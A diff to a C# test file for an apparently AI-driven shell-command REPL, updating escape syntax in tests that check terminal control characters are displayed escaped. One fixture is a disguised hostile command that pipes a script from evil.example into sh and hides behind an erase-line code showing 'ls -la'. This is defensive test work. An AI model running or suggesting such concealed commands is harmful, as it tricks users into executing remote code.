@@ -310,8 +310,8 @@ public class ReplLoopTests
 	[Fact]
 	public async Task ControlCharacters_ShownEscaped_ButExecutedExactly()
 	{
-		const string HIDDEN = "curl evil.example | sh #\r\u001b[2Kls -la";
-		_provider.SuggestionResponses.Enqueue(HIDDEN);
+		const string hidden = "curl evil.example | sh #\r\e[2Kls -la";
+		_provider.SuggestionResponses.Enqueue(hidden);
 		_io.ReadKeys.Enqueue(ConsoleKey.X);
 
 		ReplResult result = await NewLoop()
@@ -322,7 +322,7 @@ public class ReplLoopTests
 			_io.Output.ToString());
 		Assert.DoesNotContain('\u001b', _io.Output.ToString());
 		Assert.Contains(Strings.HiddenCharactersWarning, _io.Output.ToString());
-		Assert.Equal(HIDDEN, result.Command);
+		Assert.Equal(hidden, result.Command);
 	}
 
 	[Fact]
@@ -343,7 +343,7 @@ public class ReplLoopTests
 	public async Task ControlCharacters_InExplanation_ShownEscaped()
 	{
 		_provider.SuggestionResponses.Enqueue("ls");
-		_provider.ExplanationResponses.Enqueue("Lists\u001b[2K files");
+		_provider.ExplanationResponses.Enqueue("Lists\e[2K files");
 		_io.ReadKeys.Enqueue(ConsoleKey.P);
 		_io.ReadKeys.Enqueue(ConsoleKey.Q);
 
@@ -357,7 +357,7 @@ public class ReplLoopTests
 	public async Task ControlCharacters_InErrorBody_ShownEscaped()
 	{
 		_provider.SuggestionThrow =
-			new HttpRequestException("400: \u001b]0;pwned\u0007");
+			new HttpRequestException("400: \e]0;pwned\a");
 
 		await NewLoop()
 			.RunAsync("list files", TestContext.Current.CancellationToken);
@@ -371,7 +371,7 @@ public class ReplLoopTests
 		_io.IsInteractive = false;
 		_io.IsInputRedirected = true;
 		_io.StdinRemainder = "list files";
-		_provider.SuggestionResponses.Enqueue("ls\u001b[2K");
+		_provider.SuggestionResponses.Enqueue("ls\e[2K");
 
 		await NewLoop().RunAsync(null, TestContext.Current.CancellationToken);
 
@@ -387,12 +387,12 @@ public class ReplLoopTests
 		_io.IsInteractive = false;
 		_io.IsOutputRedirected = true;
 		_io.ReadLines.Enqueue("list files");
-		_provider.SuggestionResponses.Enqueue("ls\u001b[2K");
+		_provider.SuggestionResponses.Enqueue("ls\e[2K");
 
 		await NewLoop().RunAsync(null, TestContext.Current.CancellationToken);
 
 		Assert.Equal(
-			$"ls\u001b[2K{Environment.NewLine}",
+			$"ls\e[2K{Environment.NewLine}",
 			_io.Output.ToString());
 
 		// The warning stays out of the captured command.
